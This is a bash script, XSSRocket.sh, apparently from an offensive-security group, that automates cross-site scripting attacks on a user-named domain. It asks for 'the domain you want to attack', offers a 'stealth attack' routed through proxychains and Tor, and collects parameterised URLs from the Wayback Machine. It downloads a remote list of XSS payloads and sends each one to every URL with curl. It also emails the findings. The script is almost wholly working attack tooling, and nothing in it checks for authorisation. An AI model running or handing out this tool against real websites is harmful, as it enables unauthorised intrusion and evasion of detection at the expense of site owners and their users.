#!/bin/bash
# Display ASCII art from external source
curl --silent "https://raw.githubusercontent.com/blackhatethicalhacking/Subdomain_Bruteforce_bheh/main/ascii.sh" | lolcat
echo ""

# Generate a random Sun Tzu quote for offensive security
quotes=("The supreme art of war is to subdue the enemy without fighting." "All warfare is based on deception." "He who knows when he can fight and when he cannot, will be victorious." "The whole secret lies in confusing the enemy, so that he cannot fathom our real intent." "To win one hundred victories in one hundred battles is not the acme of skill. To subdue the enemy without fighting is the acme of skill.")
random_quote=${quotes[$RANDOM % ${#quotes[@]}]}
echo "Offensive security tip: $random_quote - Sun Tzu" | lolcat

echo "Important Note: If you do not change the SMTP configuration, and create your own account, you will not be able to see the results. You can use for free mailtrap.io and edit the tool source code by replacing your own credentials." | lolcat

# Print the quote
echo "Offensive security tip: $random_quote - Sun Tzu" | lolcat
sleep 1
figlet "HACK THE PLANET!" | lolcat
sleep 1
echo "MEANS, IT'S ☕ 1337 ⚡ TIME, 369 ☯ " | lolcat
sleep 1
echo "[YOUR ARE USING XSSRocket.sh] - (v2.0) CODED BY Chris 'SaintDruG' Abou-Chabké WITH ❤ FOR blackhatethicalhacking.com for Educational Purposes only!" | lolcat
sleep 1

# Ask if user wants results via email
echo "Do you want to receive the results via email? (y/n): " | lolcat
read send_email

# If user wants email, ask for their email address
if [[ "$send_email" == "y" ]]; then
echo "Enter your email to receive the results: " | lolcat
read user_email
fi

# Dependencies check for lolcat, fortune-mod, figlet, and curl
dependencies=("lolcat" "fortune" "figlet" "curl")
for dep in "${dependencies[@]}"; do
if ! command -v "$dep" > /dev/null; then
echo "$dep not found, installing..." | lolcat
if command -v dnf > /dev/null; then
sudo dnf install -y "$dep"
elif command -v yum > /dev/null; then
sudo yum install -y "$dep"
elif command -v apt-get > /dev/null; then
sudo apt-get install -y "$dep"
else
echo "Error: package manager not found, please install $dep manually"
exit 1
fi
fi
done

# Check if the user is connected to the internet
echo "CHECKING IF YOU ARE CONNECTED TO THE INTERNET!" | lolcat
wget -q --spider https://google.com
if [ $? -ne 0 ]; then
echo "++++ CONNECT TO THE INTERNET BEFORE RUNNING XSSRocket.sh!" | lolcat
exit 1
fi
echo "++++ CONNECTION FOUND, LET'S GO!" | lolcat

# Ask the user to enter a domain
echo "Enter the domain you want to attack: " | lolcat
read domain

# Ask the user if they want to perform a stealth attack
echo "Do you want to perform a stealth attack? (y/n)" | lolcat
read stealth_attack

# Use proxychains if stealth attack is selected
if [[ $stealth_attack == "y" ]]; then
echo "Checking & Installing Proxychains..." | lolcat
if ! command -v proxychains4 > /dev/null; then
echo "Installing proxychains4..." | lolcat
sudo apt-get install -y proxychains4 torsocks
torsocks
fi
echo "Proxychains installed, proceeding with stealth attack..." | lolcat
proxychains4 waybackurls $domain | grep -E '\?[a-zA-Z0-9]+=' > param_urls.txt
else
echo "Proceeding without stealth..." | lolcat
waybackurls $domain | grep -E '\?[a-zA-Z0-9]+=' > param_urls.txt
fi

# Use a remote XSS payload list from GitHub
payload_file="xss-payload-list.txt"
payload_url="https://raw.githubusercontent.com/blackhatethicalhacking/XSSRocket/main/top-500-xss-payloads.txt"
if test ! -f "$payload_file"; then
echo "Downloading payload list from: $payload_url" | lolcat
wget $payload_url -O $payload_file
fi

# Install pv (progress bar utility)
if ! command -v pv > /dev/null; then
sudo apt-get install -y pv
fi

# Start the attack
echo "Starting Attack:" | lolcat
counter=0
while read payload; do
for url in $(cat param_urls.txt | sed 's/\([^=&?]*\)=.*/\1=/g'); do
echo "Sending payload $payload to $url"
random_delay=$(awk 'BEGIN{srand();print int(rand()*2)}')
sleep $random_delay
response=$(curl -s -G "$url$payload" -w "%{http_code}")
status_code=${response: -3}
if echo "$response" | grep -q "payload_marker"; then
echo "Possibly Vulnerable to XSS! $url" | lolcat
echo $url >> affected_urls.txt
counter=$((counter+1))
triggered_payload="$payload"
fi
[[ $status_code == "200" ]] && echo -e "\033[0;32m$status_code\033[0m" || echo -e "\033[0;31m$status_code\033[0m"
echo "$url$payload"
echo -n "." | pv -qL 10
done
done < <(pv -N "XSS Payloads" xss-payload-list.txt)

# Prepare the summary for email or terminal output
summary=""
if [ -s affected_urls.txt ]; then
summary="A total of $(cat affected_urls.txt | wc -l) possible XSS injections found.\nPossible vulnerable URLs:\n$(cat affected_urls.txt)"
else
summary="No vulnerabilities found during the scan."
fi

# Save results in a folder
clean_domain=`echo $domain | tr -cd '[:alnum:]\n\r'`
mkdir $clean_domain
mv param_urls.txt affected_urls.txt $clean_domain/
echo "Results saved in $clean_domain" | lolcat

# If user opted for email, send the results via email
if [[ "$send_email" == "y" ]]; then
echo "Sending results via email to $user_email..." | lolcat
recipient="$user_email"
subject="XSS Scan Results for $domain"
body="Here is the summary of the XSS scan for $domain:\n\n$summary"
smtp_url="smtp.mailtrap.io"
smtp_port="2525"
username="add your user smtp username"
password="add your user smtp password"

curl --url "smtp://$smtp_url:$smtp_port" \
--ssl-reqd \
--mail-from "addyoursmtp@email.com" \
--mail-rcpt "$recipient" \
--upload-file <(echo -e "From: XSSRocket <taddyoursmtp@email.com>\nTo: $recipient\nSubject: $subject\n\n$body") \
--user "$username:$password"

echo -e "\nEmail sent!" | lolcat
else
# Display the summary in the terminal if user does not want email
echo "Results Summary:" | lolcat
echo -e "$summary" | lolcat
fi

# Final message
echo "Thank you for using XSSRocket.sh!" | lolcat
